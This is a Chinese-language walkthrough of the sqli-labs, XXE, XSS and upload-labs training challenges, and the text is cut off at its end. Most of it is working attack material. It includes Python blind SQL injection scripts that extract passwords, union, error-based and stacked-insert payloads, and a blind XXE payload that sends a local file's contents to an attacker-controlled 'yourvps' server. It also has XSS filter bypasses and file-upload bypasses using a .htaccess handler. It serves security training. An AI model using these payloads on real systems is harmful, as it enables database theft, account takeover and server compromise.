&quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&quot; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) level11打开网页是一个登录页面 先判断列数，当三列出现报错，说明只有两列 uname=admin&#x27; order by 2#&amp;passwd=1&amp;submit=Submit 尝试使用万能密码，成功登录 uname=admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #&amp;passwd=1&amp;submit=Submit 获取数据库 uname=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)##&amp;passwd=1&amp;submit=Submit 获取列名，字段名 uname=sda&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit uname=sda&#x27; union select 1,group_concat(password) from users#&amp;passwd=1&amp;submit=Submit level12这一关与上面就是使用的闭合符号不同，使用的双引号，所以只要将上面的payload改一下即可 uname=sda&quot; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit uname=sda&quot; union select 1,group_concat(password) from users#&amp;passwd=1&amp;submit=Submit level13输入单引号，出现报错 分析一下即可 &#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1 第二个&#39;是我们输入的，所以闭合方式为&#39;) 但是这题没有回显数据，可以使用报错注入或者延时盲注 注入的payload uname&#x3D; sa&#39;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; dsad&#39;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; asd&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit level14这一关就是和上面的闭合方式不一样，稍加修改即可 uname= sad&quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit level15这是单引号闭合的布尔盲注，POST型 判断依据可以根据页面出现的图片 登录不成功时出现的图片 登录成功的图片 这里使用时间盲注 # -*- coding = utf - 8 -*- #@Time : 2021/4/21 19:54 #@Author : sunzy #@File : level15.py import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-15/&quot; flag = &quot;&quot; data = &#123;&#x27;uname&#x27;:&#x27;admin&#x27;,&#x27;passwd&#x27;:&#x27;sad&#x27;,&#x27;submit&#x27;:&#x27;Submit&#x27;&#125; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) #payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;.format(i,mid) t1 = datetime.datetime.now() data[&#x27;uname&#x27;] = payload response = requests.post(url=url,data=data) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 5: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(flag) flag = flag + chr(mid) print(flag) print(flag) level16将上一关的脚本该给双引号闭合即可 level17updata注入 可以使用报错注入 uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select database())),1)#&amp;submit=Submit level18uname和passwd都使用check_input过滤，而在这里将user-agent和ip作为记录，插入数据库 提示了ip地址和user-Agent，应该时http头注入 抓包后，在user-agent的位置插入注入语句 1&#x27; and updatexml(1,concat(0x7e,(select database())),1) and 1=&#x27;1 level19 登录后提示了referer，应该是在referer头注入 1&#x27; and updatexml(1,concat(0x7e,(select database())),1) and 1=&#x27;1 level20正常登录，发现一个cookie字段 尝试cookie位置注入 这里直接使用union联合查询即可 uname=-adm&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()# uname=-ada&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;# uname=-ada&#x27; union select 1,group_concat(password),3 from users# level21这一关和上一关就是加了一层base64编码，所以可以直接用上面的注入编码后提交 uname=-as&#x27; union select 1,2,3# uname=LWFzJyB1bmlvbiBzZWxlY3QgMSwyLDMj 但是出现报错 uname=-as&#x27;) union select 1,2,3# uname=LWFzJykgdW5pb24gc2VsZWN0IDEsMiwzIw== 所以只要将上面的sql语句修改闭合方式再编码提交即可 level22基于错误的双引号字符型Cookie注入 这里只要将21关的双引号换成双引号，再base64编码 uname=-as&quot; union select 1,2,3# uname=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj uname=-ada&#x27; union select 1,group_concat(password),3 from users--+ uname=LWFkYSIgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSwzIGZyb20gdXNlcnMj level23根据提示可以知道是get型注入 但是但输入 2&#x27; or 1=1 # 2&#x27; or 1=1 --+ 2&#x27; or 1=1 %23 都会出现语法错误，猜测应该是 #, --两个注释符被过滤了 里我们需要一个特殊的注释符：;%00或者and和or语句进行闭合 payload: ?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users ;%00 level24二次注入 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 二次注入，可以概括为以下两步: 第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 正常用户admin可以正常登录，但是这里需要注册一个非正常的恶意用户，向数据库中插入恶意数据，来修个正常用户admin的密码 username: admin’# password: 任意 注册完后可以使用该账号登录 登录后可以更改用户的密码，此时可以随意修改密码，那么admin用户的密码就会被改成改密码 看看源码，分析原理 $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;); 将用户名和密码带入 $sql = &quot;UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 可以看到真正的sql语句为 $sql = &quot;UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; 这杨就导致了admin用户密码被改变。 level25这一关尝试可以发现，是将or和and替换成空 但是可以直接使用双写绕过，因为它只过滤了一次 所以还是可以使用union注入，就是要注意or和and单词需要双写。 level25a这一关和上一关一样是过滤了or和and，可以使用双写绕过，但是需要使用盲注 可以使用level8使用的脚本，对其payload稍加修改即可 import requests url = &quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid) # payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;Your Login name&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag) print(flag) level2626与上一关相比，很类似，空格，注释符和 / 也给过滤了 对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法： %09 TAB键（水平） %0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符) 可以使用报错注入或者盲注 payload: 0&#x27;||left(database(),1)&gt;&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 0&#x27;||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||&#x27;1&#x27;=&#x27;1 level26a与上一关一样，题目提示空格与注释被过滤了，可以使用%a0绕过，报错注入不出，可以用布尔盲注 0&#x27;||&#x27;1&#x27;=&#x27;1 #探测为&#x27; 0&#x27;||left(database(),1)=&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 白盒审计知道是&#x27;) 0%27)%a0union%a0select%a01,database(),2||(&#x27;1 0%27)%a0union%a0select%a01,database(),2;%00 level27题目提示union与select被过滤了，但是没有使用preg_ireplace(),所以可用大小写绕过 0&#x27;||&#x27;1&#x27;=&#x27;1 0&#x27;||left(database(),1)=&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 0&#x27;%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 level27a与27关基本一样，就是在id参数位置没有使用单引号闭合 payload: 0%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 level28union select大小写均被过滤，但是select还可单独用，盲注即可，注意这里的id闭合方式为(&#39;&#39;) 0&#x27;)||left(database(),1)&gt;&#x27;s&#x27;;%00 level28a与28关相比，简单很多，只是过滤了union select,所以可以继续使用上面的payload 0&#x27;)||left((database()),1)=&#x27;s&#x27;;%00 0&#x27;)||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)&lt;&#x27;s&#x27;;%00 level29利用tomcat与apache解析相同请求参数不同的特性，tomcat解析相同请求参数取第一个，而apache取第二个，如?id=1&amp;id=2，tomcat取得1，apache取得2 ?id=1&amp;id=0&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level30与 29 架构一样，原理一致只不过加了&quot;限制 ?id=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level31架构一样，多了&quot;) ?id=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level32注意是GBK，可以用%df进行宽字节注入 宽字节注入 宽字节注入利用了mysql一个特性，即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字。（前一个ASCII码要大于128，才到汉字的范围） 先了解一下这些字符的url编码： 当输入单引号，经addslashes转义后，对应的url编码是：‘ –&gt; &#39; –&gt; %5C%27当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：%df –&gt; %df \\ ‘ –&gt; （%df%5C）%27 若使用gbk编码的话，%df%5C会被当作一个汉字处理，从而使%27（单引号）逃出生天，成功绕过 payload: 0%df%27%20or%201=1%23 0%df&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level33与32相同 payload: 0%df&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level34这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将&#39;转为utf-16为 �&#39; payload: Username: 1�&#x27; or 1=1# Password: 任意 level35GET型宽字节注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。 payload: ?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+ level36直接使用32关的payload ?id=-1%df&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+ level37和less-34一样 payload: Username: 1�&#x27; or 1=1# Password: 任意 level38堆叠注入：可以执行多条语句，用分号间隔 堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的 可以使用create创建一张表 1&#x27;;create table test like users;%23 也可以向数据包中插入一条数据 ?id=1&#x27;;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level39和38一样，只不过这里是数字型，无需闭合。 ?id=1;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level40闭合方式不同而已 payload ?id=1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level41数字型注入与39关相同 ?id=1;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level42与之前几关类似，不过这里的username位置进过滤，所以需要password位置进行堆叠注入 payload Username：usnn Password：1&#x27;;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# 点击登录后，会发现登录失败，但是inert语句已经被执行了，可以使用admin123账号直接登录 level43与42的闭合方式不同 使用的是(&#39;&#39;) payload Username：usnn Password：1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level44与42相同 Username：usnn Password：1&#x27;;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level45与43相同 Username：usnn Password：1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level46order by注入 username、password均为列名，所以以下需要知道列名 ?order=if(1=1,username,password) ?order=null,if(1=1,username,password) ?order=(case when (1=1) then username else password end) ?order=ifnull(null, username) ?order=rand(1=1) //order by rand(1)/rand(0)两者返回不一样 ?order=(select 1 regexp if(1=1,1,0x00)) 将1=1换成bool盲注的语句函数即可用于获取数据sort=rand(ascii(database(),1))=115) 时间盲注 sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5)) sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5(&#x27;1&#x27;)),null) from (select database() as current) as tb1) Bool 盲注 rand(ascii(left(database()),1))=115) 报错注入： updatexml(1,if(1=1,concat(0x7e,version()),2),1) (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) procedure analyse 参数后注入 sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) into outfile参数: id=1 into outfield &quot;path&quot; 上传网马，可以在后面加上lines terminated by 16进制转码的数据 level47与46的闭合防止不用，使用报错注入 ?sort=1&#x27; and extractvalue(1,concat(0x7e,( select concat_ws(&#x27;:&#x27;,username,password) from users limit 0,1),0x7e))--+ level48使用时间盲注 1 and If(ascii(substr(database(),1,1))&gt;115,0,sleep (5))--+ sort=rand(ascii(left(database(),1))=115) import requests url = &#x27;http://127.0.0.1/Less-48/ payloads = &#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27; data = &#x27;&#x27; for i in range(50): for j in payloads: # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; try: r = requests.get(url+payload, timeout=1) except Exception: data += j print(data) break level49与47的闭合方式不同，但是可以使用盲注 1&#x27; and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+ 1&#x27; and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+ level50order by与堆叠注入结合，数字型 payload: ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level51与50关相比增加单引号闭合 ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level52与50相同 ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level53和51一样，只是不会回显错误，堆叠注入方式相同。 ?sort=1&#x27;;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ xxe挑战github地址：https://github.com/vulnspy/phpaudit-XXE/archive/master.zip 因为环境搭建比较简单就直接在windows上运行了 读取的文件也随之改变，在D盘中建立一个1.txt DOMDocument使用如下payload读取文件 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; 漏洞原因 DOmDocument类 $dom = new DOMDocument(); libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($data, LIBXML_NOENT); ob_start(); var_dump($dom); $resp = ob_get_contents(); ob_end_clean(); &#125; SimpleXMLElement使用payload： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; 漏洞代码 造成 XXE 的类是 SimpleXMLElement libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = new SimpleXMLElement($data, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125; simplexml_load_stringpayload: &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; 造成漏洞的是simplexml_load_string，代码如下 $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = simplexml_load_string($data, &#x27;SimpleXMLElement&#x27;, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125; BlindXXE这一关提交payload无法看到内容，但是可以看到是访问成功的 正常情况下，只会返回给我们ok，即有查询结果，但是不会告诉我们结果是什么 源码如下 &lt;?php if(isset($_GET[&#x27;s&#x27;]))&#123; show_source(__FILE__); exit; &#125; libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = simplexml_load_string($data, &#x27;SimpleXMLElement&#x27;, LIBXML_NOENT); if($xml &amp;&amp; isset($xml-&gt;name))&#123; $name = $xml-&gt;name; &#125; echo isset($name)?&#x27;ok&#x27;:&#x27;error&#x27;; &#125; ?&gt; 上面的例子是因为echo htmlspecialchars($resp);这句代码所以才有回显，那么把这段代码去掉，就变成了无回显。那么，是不是就不能进行xxe了呢，答案是否定的，虽然靶机没有返回给我们数据，但是我们可以把数据带到我们自己的服务器上。 我们传入如下的payload： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://yourvps/evil.xml&quot;&gt; %dtd; %send; ]&gt; &lt;abc&gt;&lt;/abc&gt; 然后在自己的vps上的evil.xml写入： &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;&gt; %payload; 注意，因为这里是参数实体payload来嵌套定义参数实体send，所以被嵌套定义的参数实体%一定要HTML编码为：% 如此一来，调用的过程就变成了：参数实体dtd通过http协议来访问vps上的evil.xml，然后返回evil.xml的内容，调用了参数实体payload，然后payload又调用了参数实体send，send的作用就是把参数实体file（即文件D:/1.txt的base64编码内容）发送到我们的vps上，注意在服务器上监听 xss通关因为网上有挑战题目的网址就没在本地搭建 1最基础的xss，get提交 ?name=&lt;script&gt;alert(1)&lt;/script&gt; 2第二关直接提交会发现没有弹窗 查看源码可以看到，因为&lt;script&gt;，被包裹在input标签中无法起作用，因此需要先闭合input标签 payload &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 3直接提交查看源码 可以发现提交后的数据经过htmlspecialchars()转化成了实体变量不在有js代码的作用，所以需要换一种方法 payload &#39;onclick&#x3D;&#39;javascript:alert(1)&#39; 再点击一次就可以过关 4这题与上面的一样只不过这次换成了双引号闭合 &quot;onclick=&#x27;javascript:alert(1)&#x27; 5提交&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 可以发现script被换成了scr_ipt，使用&quot;onclick=&#39;javascript:alert(1)&#39;也不行 再换一种方法 6尝试了 &lt;input name=keyword value=&quot; &quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;&quot;&gt; &lt;input name=keyword value=&quot; &quot;o_nclick=&#x27;javascript:alert(1)&#x27; &quot;&gt; &lt;input name=keyword value=&quot; &quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;&gt; 但是都不行了，尝试了看样子是过了href, onclick, script关键词，尝试大小写绕过 提交 &quot;oNclick=&#x27;javascript:alert(1)&#x27; 7提交&quot;oNclick=&#39;javascript:alert(1)&#39;,但是发现on被过滤了 直接尝试双写绕过 oonnclick=&#x27;javascript:alert(1) 8提交&quot;oNclick=&#39;javascript:alert(1)，可以发现过滤了 &quot; &lt; &gt;，而且进行了实体转换 换一种新的注入方法html字符转换绕过 java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) 9尝试第八关使用的代码但是发现不行 但是查看源码可以发现提示你的链接不合法，那么合法的链接有什么特点呢 就是带有协议头 java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) // http:// 10尝试了几种方法之后发现 ,没有输出点 可以发现输入点是隐藏的 使用下面代码测试以上三个哪个是可以注入的 &amp;t_link=&quot; text&quot; &amp;t_history=&quot;text&quot;&amp;t_sort=&quot;text&quot; 再构造代码 &amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1) 11进入页面后尝试使用上一关的方法但是无效，上网查看后发现是再refere头注入 可以发现相应包中已经被注入了XSS 在抓包页面返回给浏览器，就会出现被注入的输入框 12继续抓包，这次可以发现是在UA中注入 与上一关做法相似 出现输入框点击即可 13这关是在cookie处注入，方法与之前相同 payload cookie: 原值+user=&quot; type=text onclick=&quot;alert(1) 14需要使用带XSS的图片 15直接查看源码 这里用了angularjs的ng-include，直接在包含的页面里用&lt;script&gt;触发不了，用了img标签 AngularJS ng-include 指令 ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 &lt;element ng-include=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/element&gt; 遵循SOP，只好调用第一关代码。 需要单引号包裹，否则变成注释。 paload： /level15.php?src=&#x27;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&#x27; 16测试发现过滤空格，script，/，所以使用%0d %0a做分割符绕过过滤 payload &lt;img%0Asrc=x%0Aonerror=alert(a)&gt; &lt;iframe%0asrc=x%0donmouseover=alert`1`&gt;&lt;/iframe&gt; 17查看源码找到注入位置 但是这里过滤&lt;, &gt;，使用事件触发弹窗 Payload： ?arg01=&amp;arg02= onmouseover=alert(1) 文件上传环境使用phpstudy很容易搭建 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 抓包修改MIME即可 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream 更详细的解释， pass3$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 